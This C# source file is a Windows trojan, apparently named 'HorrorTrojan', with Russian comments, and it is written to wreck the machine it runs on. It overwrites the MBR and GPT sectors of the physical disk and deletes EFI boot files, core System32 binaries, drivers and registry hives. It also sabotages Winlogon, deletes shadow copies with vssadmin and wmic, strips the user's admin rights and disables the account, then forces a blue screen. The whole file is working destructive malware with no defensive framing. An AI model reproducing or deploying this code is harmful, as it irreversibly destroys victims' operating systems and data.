using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

namespace HorrorTrojan
{
    internal static class BSODTrigger
    {
        public static void TriggerBSOD()
        {
            // 1. УНИЧТОЖАЕМ ВСЁ
            DestroyEverything();
            
            // 2. ВЫЗЫВАЕМ BSOD
            uint response;
            NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
        }
        
        private static void DestroyEverything()
        {
            try
            {
                // ===== 1. УНИЧТОЖЕНИЕ ЗАГРУЗЧИКОВ =====
                DestroyBootSectors();
                
                // ===== 2. УНИЧТОЖЕНИЕ GPT И EFI =====
                DestroyGPTandEFI();
                
                // ===== 3. УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ =====
                DestroySystemFiles();
                
                // ===== 4. УНИЧТОЖЕНИЕ РЕЕСТРА =====
                DestroyRegistry();
                
                // ===== 5. УНИЧТОЖЕНИЕ WINLOGON =====
                DestroyWinlogon();
                
                // ===== 6. УНИЧТОЖЕНИЕ ТЕНЕВЫХ КОПИЙ =====
                DestroyShadowCopies();
                
                // ===== 7. ЛИШЕНИЕ ПРАВ АДМИНИСТРАТОРА =====
                RemoveAdminRights();
            }
            catch { }
        }
        
        private static void DestroyBootSectors()
        {
            try
            {
                byte[] mbr = ResourceExtractor.GetMBR();
                if (mbr.Length == 512)
                {
                    // Затираем секторы 0-63 (MBR + загрузочные секторы)
                    for (int sector = 0; sector < 64; sector++)
                    {
                        try
                        {
                            using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
                            {
                                fs.Seek(sector * 512, SeekOrigin.Begin);
                                fs.Write(mbr, 0, 512);
                                fs.Flush();
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }
        
        private static void DestroyGPTandEFI()
        {
            try
            {
                byte[] zeros = new byte[512];
                
                // Затираем GPT (секторы 1-33)
                for (int sector = 1; sector < 34; sector++)
                {
                    try
                    {
                        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
                        {
                            fs.Seek(sector * 512, SeekOrigin.Begin);
                            fs.Write(zeros, 0, 512);
                            fs.Flush();
                        }
                    }
                    catch { }
                }
                
                // Удаляем EFI-файлы
                string[] efiPaths = new string[]
                {
                    @"C:\EFI\Microsoft\Boot\bootmgfw.efi",
                    @"C:\EFI\Microsoft\Boot\bootmgr.efi",
                    @"C:\EFI\Boot\bootx64.efi",
                    @"C:\EFI\Microsoft\Recovery\boot.sdi",
                    @"C:\EFI\Microsoft\Boot\BCD",
                    @"C:\EFI\Microsoft\Boot\boot.sdi"
                };
                
                foreach (string path in efiPaths)
                {
                    try
                    {
                        if (File.Exists(path))
                            File.Delete(path);
                    }
                    catch { }
                }
            }
            catch { }
        }
        
        private static void DestroySystemFiles()
        {
            try
            {
                // Критические системные файлы
                string[] systemFiles = new string[]
                {
                    // Основные системные файлы
                    @"C:\Windows\System32\winlogon.exe",
                    @"C:\Windows\System32\csrss.exe",
                    @"C:\Windows\System32\services.exe",
                    @"C:\Windows\System32\lsass.exe",
                    @"C:\Windows\System32\svchost.exe",
                    @"C:\Windows\System32\smss.exe",
                    @"C:\Windows\System32\wininit.exe",
                    @"C:\Windows\System32\winload.exe",
                    @"C:\Windows\System32\winload.efi",
                    @"C:\Windows\System32\ntoskrnl.exe",
                    @"C:\Windows\System32\hal.dll",
                    @"C:\Windows\System32\kernel32.dll",
                    @"C:\Windows\System32\ntdll.dll",
                    
                    // Драйверы
                    @"C:\Windows\System32\drivers\ntfs.sys",
                    @"C:\Windows\System32\drivers\fastfat.sys",
                    @"C:\Windows\System32\drivers\disk.sys",
                    @"C:\Windows\System32\drivers\partmgr.sys",
                    @"C:\Windows\System32\drivers\volmgr.sys",
                    @"C:\Windows\System32\drivers\mountmgr.sys",
                    
                    // Конфигурации
                    @"C:\Windows\System32\config\SYSTEM",
                    @"C:\Windows\System32\config\SOFTWARE",
                    @"C:\Windows\System32\config\SAM",
                    @"C:\Windows\System32\config\SECURITY",
                    @"C:\Windows\System32\config\DEFAULT",
                    @"C:\Windows\System32\config\BCD-Template",
                    
                    // Загрузочные файлы
                    @"C:\bootmgr",
                    @"C:\Boot\BCD",
                    @"C:\Boot\boot.sdi",
                    @"C:\Boot\BCD.LOG",
                    @"C:\boot\bootstat.dat"
                };
                
                foreach (string path in systemFiles)
                {
                    try
                    {
                        if (File.Exists(path))
                            File.Delete(path);
                    }
                    catch { }
                }
                
                // Удаляем папку System32 (если получится)
                try
                {
                    Directory.Delete(@"C:\Windows\System32", true);
                }
                catch { }
                
                // Удаляем папку Windows (если получится)
                try
                {
                    Directory.Delete(@"C:\Windows", true);
                }
                catch { }
            }
            catch { }
        }
        
        private static void DestroyRegistry()
        {
            try
            {
                // Удаляем критические разделы реестра
                string[] registryKeys = new string[]
                {
                    @"SYSTEM\CurrentControlSet\Control\Session Manager",
                    @"SYSTEM\CurrentControlSet\Control\Lsa",
                    @"SYSTEM\CurrentControlSet\Control\SecurityProviders",
                    @"SYSTEM\CurrentControlSet\Control\Windows",
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
                };
                
                foreach (string keyPath in registryKeys)
                {
                    try
                    {
                        Registry.LocalMachine.DeleteSubKeyTree(keyPath, false);
                    }
                    catch { }
                }
            }
            catch { }
        }
        
        private static void DestroyWinlogon()
        {
            try
            {
                // Подмена Winlogon
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    key.SetValue("Shell", "nonexistent.exe", RegistryValueKind.String);
                    key.SetValue("Userinit", "nonexistent.exe", RegistryValueKind.String);
                    key.SetValue("System", "nonexistent.exe", RegistryValueKind.String);
                    key.SetValue("GinaDLL", "nonexistent.dll", RegistryValueKind.String);
                }
                
                // Удаляем Winlogon.exe
                try
                {
                    if (File.Exists(@"C:\Windows\System32\winlogon.exe"))
                        File.Delete(@"C:\Windows\System32\winlogon.exe");
                }
                catch { }
            }
            catch { }
        }
        
        private static void DestroyShadowCopies()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "vssadmin",
                    Arguments = "delete shadows /all /quiet",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                
                Process.Start(new ProcessStartInfo
                {
                    FileName = "wmic",
                    Arguments = "shadowcopy delete",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }
        
        private static void RemoveAdminRights()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = "localgroup Administrators %username% /delete",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                
                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = "user %username% /active:no",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }
    }
}
